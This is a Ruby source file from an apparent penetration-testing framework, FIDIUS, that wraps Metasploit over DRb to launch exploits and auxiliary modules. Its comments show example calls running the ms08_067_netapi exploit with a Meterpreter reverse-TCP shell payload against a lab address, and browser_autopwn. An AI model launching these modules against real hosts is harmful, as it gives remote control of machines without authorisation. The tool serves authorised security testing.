module FIDIUS
  module Action
    # This class acts as DRb wrapper for the Metasploit framework.
    # Since Msf is a singleton object, you might get the framework with
    # something like
    #
    #     msf = FIDIUS::Action::Msf.instance.framework
    #
    # You might get an Error::ENOENT if the configuration file
    # (+config/fidius.yml+) was not found.
    class Msf
      include Singleton

      # Initializes the singleton object with the configuration located
      # in +config/msf.yml+. Currently, only the +:drb_host+ and +:drb_port+
      # values are evaluated.
      #
      # The construction will fail if the configuration yaml file could
      # not be found.
      def initialize
        host, port = FIDIUS.config['metasploit']['host'], FIDIUS.config['metasploit']['port']
        @uri = "druby://#{host}:#{port}"
        begin
          DRb.current_server
        rescue DRb::DRbServerNotFound
          DRb.start_service
          ThreadGroup.new.add DRb.thread
        end
      rescue
        puts "No `metasploit' section in `config/fidius.yml' found."
        raise
      end

      # Returns the Metasploit framework. Getting this object is not
      # cached. You may do that on your own.
      # 
      # @return [Msf::Simple::Framework]  The Metasploit framework.
      def framework
        daemon.framework
      end

      # Runs the exploit with the given name and the given opts.
      #
      # example usage: msf.run_exploit("windows/smb/ms08_067_netapi",
      #   {"PAYLOAD" => "windows/meterpreter/reverse_tcp",
      #     "RHOST" => "192.168.56.101", "LHOST" => "192.168.56.1"})
      #
      # @param [String]  exploit
      # @param [Hash]  opts
      # @param [bool]  async true to start exploit in a new thread
      # @return [Msf::Session] A Session got for this exploit.
      def run_exploit(exploit, opts, async = true)
        daemon.run_exploit(exploit, {
          'Payload'  => opts['PAYLOAD'],
          'Target'   => opts['TARGET'],
          'RunAsJob' => async,
          'Options'  => opts
        })
      end

      # Runs the auxiliary with the given name and the given opts.
      #
      # example usage: msf.run_exploit("server/browser_autopwn",
      #   {'LHOST' => "192.168.0.1", 'SRVHOST' => "192.168.0.1", 'URIPATH' => "/" })
      #
      # @param [String]  auxiliary
      # @param [Hash]  opts
      # @param [bool]  async true to start auxiliary in a new thread
      def run_auxiliary(auxiliary, opts, async = true)
        daemon.run_auxiliary(auxiliary, {
          'Action'   => opts['ACTION'],
          'RunAsJob' => async,
          'Options'  => opts
        })
      end

      # Adds a subscriber for the session events. This is called e.g on
      # session create.
      #
      # @param [TODO]  handler The methods on this object are called when an
      #                   event occurres.
      def add_session_subscriber(handler)
        daemon.framework.events.add_session_subscriber(handler)
      end

      # Returns the Metasploit framework DRb wrapper. Useful for debugging.
      #
      # @return [FIDIUS::MsfDRbD]  The DRb wrapper.
      def daemon
        @msf_daemon ||= DRbObject.new nil, @uri
      end

    end # class Msf
  end # module Action
end # module FIDIUS